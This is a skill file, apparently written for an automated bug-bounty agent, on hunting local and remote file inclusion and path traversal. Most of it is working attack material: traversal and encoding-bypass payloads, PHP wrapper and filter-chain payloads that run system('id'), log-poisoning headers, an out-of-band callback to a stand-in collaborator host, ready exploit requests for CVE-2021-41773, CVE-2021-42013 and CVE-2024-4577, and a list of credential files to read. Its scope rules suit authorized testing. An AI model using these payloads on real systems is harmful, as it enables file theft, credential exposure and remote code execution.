---
name: hunt-lfi
description: "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, CNEXT/CVE-2024-2961 iconv overflow (php://filter file-read → RCE on Linux glibc), RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target."
sources: hackerone_public, synacktiv_research, portswigger_research
report_count: 31
---

# HUNT-LFI — File include and path traversal

Two bugs share payloads and differ in impact: **include/execute** (PHP `include`, template path, JSP import) versus **read** (`sendFile`, `res.sendFile`, `open()`, download handler). Prove file **bytes** you did not send. An echoed path is the formatter talking, not a read.

## Rails
- In-scope only. Read one fingerprint file, then one high-value file if the first read worked. Stop.
- No mass file grabs, no worm, no persistent webshell left behind. A one-shot `id` is the RCE proof.
- No directory brute force. Candidates come from crawled parameters and the filenames the app already uses.
- Log/session poisoning writes a line into a log — do it once, with a unique marker, and only after a plain read of that log shows you can include it.
- Stop at draft. Never auto-submit.

## Decision tree

1. **Mark every parameter that names a resource:** `file`, `path`, `page`, `template`, `view`, `lang`, `include`, `doc`, `download`, `img`, `pdf`, `report`, `theme`, `folder`, `next`, JSON `filename`/`template`/`path`, and route prefixes that map to disk (`/static/`, `/download/`, `/export/`).
2. **Baseline** a real document id versus `___no_such_<uniq>`. Note status, length, content-type.
3. **Traversal, three forms, stop at the first content hit:**
   - Relative: `../` repeated, then `....//` if `../` is stripped once.
   - Absolute: `/etc/passwd`, `C:\windows\win.ini`.
   - Encoded: `..%2f`, `%2e%2e%2f`, `%252f` (double decode), `..%5c`, mixed `..\/`.
4. **Did the body contain file bytes?**
   - `root:x:0:0:` or `[extensions]` from `win.ini` → read confirmed. Go to high-value files (one or two).
   - Base64 alphabet from `php://filter` → decode; valid PHP/source = confirmed.
   - Error says `failed to open '.../etc/passwd'` and the body contains your path string → **not** a read. The app interpolated the string into an error.
   - Stable **length** gap between a known file and `___no_such` across 3 paired repeats → blind read. A **timing** gap needs ≥10 interleaved pairs (exists, missing, exists, missing) and a third path (`/etc/hosts` vs `/etc/hostname`) on the "exists" side.
   - Nothing → try engine-specific wrappers and alias bugs below **once**. Then leave the parameter.
5. **If the primitive is PHP `include`** (not a download), try wrappers in the order in Phase P. `php://filter` read does not need `allow_url_include`. `data://` and `php://input` do. Filter-chain RCE does not.
6. **RCE** only after a read or a confirmed include, and only one command.

## Payloads

**Unix / Windows traversal**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
..\..\..\windows\win.ini
..%5c..%5c..\windows\win.ini
C:\windows\win.ini
```
Null-byte `%00.jpg` only matters on PHP &lt; 5.3.4. Do not spend time on it on modern banners.

**Prefix join bugs**
- App prepends `/var/app/views/`: extra `../`, or an absolute path when the join drops the prefix on an absolute segment — Python `os.path.join('/var/www', '/etc/passwd')` → `/etc/passwd`, and Node `path.resolve` behaves the same (Node `path.join` does **not**; it keeps the prefix). Always try an absolute path, not only `../`.
- Nginx `alias` without a trailing-slash match: `GET /static../etc/passwd` (location `/static` aliased to a directory). Also `/static/..%2f..%2fetc/passwd`.
- Tomcat / Spring: `/..;/WEB-INF/web.xml`, `..%252fWEB-INF/web.xml`.
- Java resource: `file:///etc/passwd`, `WEB-INF/web.xml`, `WEB-INF/classes/application.properties`.

**PHP wrappers** (include or `file_get_contents` sink)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/etc/passwd
```
Decode the body. Raw `<?php` is often swallowed by the engine — base64 first, always.

`data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==` and `POST` body to `php://input` execute only when `allow_url_include=On`. `expect://id` only when the expect extension is loaded. A failed wrapper is not a finding.

`zip://uploads/a.zip#payload` and `phar://uploads/a.phar` only after you uploaded that archive. One include. `zip://` reads an entry; `phar://` unserializes metadata when the sink is a file function (`file_exists`, `include`).

**Filter-chain RCE** (Synacktiv 2022, not a CVE): if `php://filter` reads, `iconv` filters can build `<?php ... ?>` in memory and `include` runs it. No upload and no log file.
```bash
python3 php_filter_chain_generator.py --chain '<?php echo md5("LFIUNIQ"); system("id"); ?>'
```
Put the printed chain in the same parameter. Confirm `md5` of `LFIUNIQ` or `uid=` in the body. Blind: one `file_get_contents('http://UNIQUE.collab/'+php_uname())`. Chains are long — if a length limit hits, send them in the POST body. Do not loop generators.

**CNEXT / CVE-2024-2961** (Lexfo/Ambionics 2024): a *different* filter-chain. glibc `iconv` overflow when converting **to** `ISO-2022-CN-EXT`. If `php://filter` already reads, Linux + glibc ≤ 2.39 can turn that read into RCE (PHP 7+ through current). Windows is not this CVE. One shot with the public `cnext-exploit.py` (or an equivalent chain) against a **file you already proved readable**. Proof is `uid=` or one OOB callback. A 500 / segfault is **not** RCE — stop; do not spray charsets. Patched glibc or missing `ISO-2022-CN-EXT` gconv = lead only.

**RFI:** `http://UNIQUE.collab/a.txt` (and `https://`, `ftp://`). A callback with the server IP means the include **fetched**. Execution still needs `<?php` to run and return `id` or a second callback. Off by default (`allow_url_include`). Trailing `?` or `#` when the app appends `.php`.

**Log / session poison → RCE** only after a normal traversal read of that file shows its contents (so you know it is readable and included, not just requested):
- One request with `User-Agent: <?php echo md5("LFIUNIQ"); system("id"); ?>` then include the access log you already read (`/var/log/nginx/access.log`, `/var/log/apache2/access.log`, `/var/log/httpd/access_log`, `/proc/self/environ`).
- Session: write the marker through a profile field, include `/var/lib/php/sessions/sess_<id>` or `/tmp/sess_<id>` once.
- `phar://` only if you already uploaded a phar and the sink calls a file function that unserializes metadata (`file_exists` on user path). One object, OOB or `id`.

**High-value single reads** (pick what matches the OS you just proved; stop after one or two):
```
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/
/proc/self/fd/
var/www html .env, config.php, wp-config.php, app/config/parameters.yml
/var/run/secrets/kubernetes.io/serviceaccount/token
~/.aws/credentials
WEB-INF/web.xml
web.config
```
Do not pull `/etc/shadow` in a loop, and do not walk home directories.

## Bypass table

| Filter | Try |
|---|---|
| Strips `../` once | `....//`, `....\/` |
| Decodes once | `%252f`, `%252e%252e%252f` |
| Blocks the substring `../` | `%2e%2e%2f`, `..%2f`, unicode slash `%ef%bc%8f` on stacks that normalize it |
| Appends `.php` | trailing `?`, `#`, or an existing allowed extension the wrapper ignores |
| Blocks `php://` | `PHP://`, `pHp://`; `data://` only if url_include is on |
| Blocks the literal `/etc/passwd` | `/etc/./passwd`, `/etc//passwd`, `/proc/self/root/etc/passwd` |
| `open_basedir` | stay inside the jail for the read; filter-chain and logs often still fail — do not claim a bypass you did not execute |
| Windows | `..\`, `%5c`, `C:\`, `::$DATA` on a file you may read |

## Validation
- **Read:** body contains file content. `/etc/passwd` must include a `root:x:0:0:` line. Diff against `___no_such_<uniq>` — the delta is the file, not a WAF page. Base64 must decode to real source.
- **Blind:** three length pairs (exists / missing / second known file) whose sizes stay apart. A timing oracle is ≥10 interleaved pairs, not three. Or an OOB hit from the included payload (RFI or filter-chain), unique host per parameter.
- **RCE:** `uid=` or your `md5("LFIUNIQ")` hex in the body, or one callback. "200 OK and the file was stored" is not execution.
- **Not a finding:** reflected path in an error, a 403 that mentions `../`, status-code-only diffs.

**Severity you can defend:** non-sensitive file (Medium); secrets you actually read — DB password, cloud key, `machineKey`, k8s token (High); command output via filter-chain, CNEXT, RFI, log/session include, or `phar` (Critical). Quote the bytes. Do not upgrade a `passwd` read to RCE because a wrapper "might" work.

## Chains
- Source read → next sink (SQL DSN, SSTI, hardcoded secret). File the secret you read, not the hypothetical RCE.
- `web.config` / `applicationHost.config` machineKey → `hunt-deserialization` ViewState. Only if the key is in the bytes you retrieved.
- k8s token from the serviceaccount file → one in-scope API GET. Do not create pods.
- Upload + `phar://` or traversal filename → `hunt-file-upload` / `hunt-rce`.
- `php://filter` read on Linux glibc ≤ 2.39 → CNEXT (`CVE-2024-2961`) one `id`/OOB.
- Apache 2.4.49 / 2.4.50 (`CVE-2021-41773`, `CVE-2021-42013`) and PHP-CGI on Windows (`CVE-2024-4577`, fixed in 8.1.29 / 8.2.20 / 8.3.8) look like traversal. Test only when the banner matches. One file or one `id`.
  - 2.4.49: `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`
  - 2.4.50: `GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd`
  - CVE-2024-4577, one POST, body `<?php echo md5("LFIUNIQ"); system("id"); ?>`:
    `POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`
    Also one try at `/php-cgi/php-cgi.exe` with the same query if the docroot is CGI. Proof is the md5 hex or `uid=`. A 200 with neither is not RCE.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
